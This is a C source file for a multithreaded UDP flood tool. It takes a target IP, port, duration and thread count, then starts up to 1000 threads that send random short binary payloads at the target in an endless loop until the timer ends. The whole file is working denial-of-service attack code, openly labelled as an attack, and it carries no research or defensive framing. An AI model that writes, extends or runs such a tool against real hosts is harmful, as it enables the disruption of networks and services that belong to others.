#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>

#define MAX_PACKET_SIZE 1472
#define THREAD_LIMIT 1000

volatile sig_atomic_t attack_running = 1;

void handle_interrupt(int sig) {
    attack_running = 0;
}

// Structure for thread parameters
typedef struct {
    char ip[INET_ADDRSTRLEN];
    int port;
} ThreadArgs;

// Binary-safe payloads with lengths
typedef struct {
    const char *data;
    size_t length;
} Payload;

Payload payloads[] = {
    { "\x3F\xA2\x91\x7C\xE5\xD0\x44\xB8\x9E\xF3\x12\x67\x88\xCD\x01\xFA", 16 },
    { "\x6B\x1D\xE9\xA4\x55\xFF\x33\xC8\x77\x22\x99\xBB\x00\x11\xDE\xAD", 16 },
    { "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF", 12 },
    { "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 12 },
    { "\x12\x34\x56\x78\x9A\xBC\xDE\xF0", 8 },
    { "\xDE\xAD\xBE\xEF", 4 },
    { "\xAB\xCD\xEF\x01\x23\x45\x67\x89", 8 },
    { "\x01\x00\x00\x00\x00\x00\x00\x00", 8 }
};

size_t payload_count = sizeof(payloads) / sizeof(payloads[0]);

void *udp_flood(void *arg) {
    ThreadArgs *args = (ThreadArgs *)arg;
    struct sockaddr_in server_addr;
    int sockfd;

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return NULL;
    }

    // Set DF flag to avoid fragmentation
    int optval = IP_PMTUDISC_DO;
    if (setsockopt(sockfd, IPPROTO_IP, IP_MTU_DISCOVER, &optval, sizeof(optval)) == -1) {
        perror("setsockopt failed");
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    server_addr.sin_addr.s_addr = inet_addr(args->ip);

    while (attack_running) {
        Payload *p = &payloads[rand() % payload_count];
        sendto(sockfd, p->data, p->length, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    }

    close(sockfd);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <TIME(sec)> <THREADS>\n", argv[0]);
        return EXIT_FAILURE;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads > THREAD_LIMIT) {
        printf("Too many threads requested. Limiting to %d.\n", THREAD_LIMIT);
        threads = THREAD_LIMIT;
    }

    srand(time(NULL));
    signal(SIGINT, handle_interrupt);

    pthread_t *thread_ids = malloc(sizeof(pthread_t) * threads);
    ThreadArgs args;
    strncpy(args.ip, ip, INET_ADDRSTRLEN);
    args.port = port;

    printf("[+] Starting UDP flood on %s:%d for %d seconds with %d threads...\n", ip, port, duration, threads);

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_ids[i], NULL, udp_flood, &args);
    }

    sleep(duration);
    attack_running = 0;

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("[+] Attack finished.\n");
    return EXIT_SUCCESS;
}
